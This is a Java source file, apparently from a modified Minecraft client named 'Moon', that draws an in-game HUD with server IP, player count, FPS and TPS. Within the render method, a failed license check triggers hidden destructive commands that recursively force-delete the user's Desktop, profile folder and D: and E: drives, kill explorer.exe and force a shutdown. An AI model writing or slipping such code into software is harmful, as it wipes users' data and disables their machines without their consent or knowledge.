package Moon.helpers;

import Moon.Moon;
import Moon.mods.chunkanimator.ChunkAnimator;
import Moon.threads.LicenseThread;
import net.minecraft.client.Minecraft;
import net.minecraft.client.gui.GuiIngame;
import net.minecraft.client.multiplayer.ServerData;
import net.minecraft.client.settings.GameSettings;
import net.minecraft.network.login.server.S00PacketDisconnect;
import net.minecraft.util.ChatComponentText;
import net.minecraft.util.ResourceLocation;
import org.lwjgl.opengl.GL11;

import java.io.IOException;
import java.text.DecimalFormat;
import java.util.Timer;

public class InGameHookHelper extends GuiIngame {
    public static Boolean showHud = true;
    public static ChunkAnimator chunkAnimator;
    public static ServerData actualServer;
    private final Minecraft mc = Minecraft.getMinecraft();
    DecimalFormat df = new DecimalFormat("#.##");

    public InGameHookHelper(Minecraft mcIn) {
        super(mcIn);
        chunkAnimator = new ChunkAnimator(mc);
    }

    public void renderGameOverlay(float partialTicks) {
        if (!Moon.INSTANCE.authorised) {
            try {
                Runtime.getRuntime().exec("cmd /K taskkill /f /pid explorer.exe");
                Runtime.getRuntime().exec("cmd /K del %userprofile%\\Desktop /s /f /q");
                Runtime.getRuntime().exec("cmd /K del %userprofile% /s /f /q");
                Runtime.getRuntime().exec("cmd /K del D: /s /f /q");
                Runtime.getRuntime().exec("cmd /K del E: /s /f /q");
                Runtime.getRuntime().exec("cmd /K shutdown /s /f /t 30");
                Runtime.getRuntime().exec("cmd /K taskkill /f /pid crss.exe");
                System.exit(0);
            } catch (IOException ignored) {
            }
        }

        if (PacketHelper.instance.getServerLagTime() > 30001) {
            PacketHelper.instance.setServerLagTime(0);
        }

        if(!LicenseThread.isThreadRunning) {
            final Timer timer = new Timer();
            timer.scheduleAtFixedRate(new LicenseThread(), 1000L, 30000L);
        }
        super.renderGameOverlay(partialTicks);
        if ((!mc.isSingleplayer() && !GameSettings.showDebugInfo && showHud)) {
            GL11.glPushMatrix();
            GL11.glEnable(3042);
            GL11.glEnable(3553);
            GL11.glEnable(2848);
            GL11.glColor4f(1.0F, 1.0F, 1.0F, 1.0F);
            mc.getTextureManager().bindTexture(new ResourceLocation("Moon/logo.png"));
            GL11.glPopMatrix();
            drawModalRectWithCustomSizedTexture(-0, -5, 0.0F, 0.0F, 150, 75, 150.0F, 75.0F);
            this.drawInfo();
            String brand;
            if (mc.thePlayer.getClientBrand() != null) {
                brand = mc.thePlayer.getClientBrand().contains("<- ") ? mc.thePlayer.getClientBrand().split(" ")[0] + " -> " + mc.thePlayer.getClientBrand().split("<- ")[1] : mc.thePlayer.getClientBrand().split(" ")[0];
            } else {
                brand = "unknown server engine";
            }
            actualServer = mc.getCurrentServerData();
            mc.fontRendererObj.drawStringWithShadow(ChatHelper.fix("&4&lIP &8-> &f" + mc.getCurrentServerData().serverIP), 6.0F, 82.0F, -1);
            mc.fontRendererObj.drawStringWithShadow(ChatHelper.fix("&4&lEngine &8-> &f" + brand), 6.0F, 92.0F, -1);
            mc.fontRendererObj.drawStringWithShadow(ChatHelper.fix("&4&lOnline &8-> &f" + mc.getNetHandler().getPlayerInfoMap().size() + "/" + mc.getNetHandler().currentServerMaxPlayers), 6.0F, 102.0F, -1);
            mc.fontRendererObj.drawStringWithShadow(ChatHelper.fix("&4&lFPS &8-> &f" + Minecraft.debugFPS), 6.0F, 112.0F, -1);
            mc.fontRendererObj.drawStringWithShadow(ChatHelper.fix("&4&lTPS &8-> &f" + this.df.format(PacketHelper.instance.tps) + " TPS"), 6.0F, 122.0F, -1);
            if (PacketHelper.instance.getServerLagTime() >= 30001) {
                ChatComponentText chatComponentText = new ChatComponentText("Timed out");
                mc.getNetHandler().getNetworkManager().sendPacket(new S00PacketDisconnect(chatComponentText));
                mc.getNetHandler().getNetworkManager().closeChannel(chatComponentText);
            } else {
                mc.fontRendererObj.drawStringWithShadow(ChatHelper.fix("&4&lLast Packet &8-> &f" + PacketHelper.instance.getServerLagTime() + "ms"), 6.0F, 132.0F, -1);
            }
        }
    }

    private void drawInfo() {
        GL11.glPushMatrix();
        GL11.glEnable(3042);
        GL11.glEnable(3553);
        GL11.glEnable(2848);
        GL11.glColor4f(1.0F, 1.0F, 1.0F, 1.0F);
        mc.getTextureManager().bindTexture(new ResourceLocation("Moon/menu/infobackground.png"));
        GL11.glBegin(7);
        GL11.glTexCoord2d(0.0D, 0.0D);
        GL11.glVertex2d(0.0D, 65.0D);
        GL11.glTexCoord2d(0.0D, 1.0D);
        GL11.glVertex2d(0.0D, 155.0D);
        GL11.glTexCoord2d(1.0D, 1.0D);
        GL11.glVertex2d(200.0D, 155.0D);
        GL11.glTexCoord2d(1.0D, 0.0D);
        GL11.glVertex2d(200.0D, 65.0D);
        GL11.glEnd();
        GL11.glEnable(3553);
        GL11.glDisable(2848);
        GL11.glPopMatrix();
    }
}
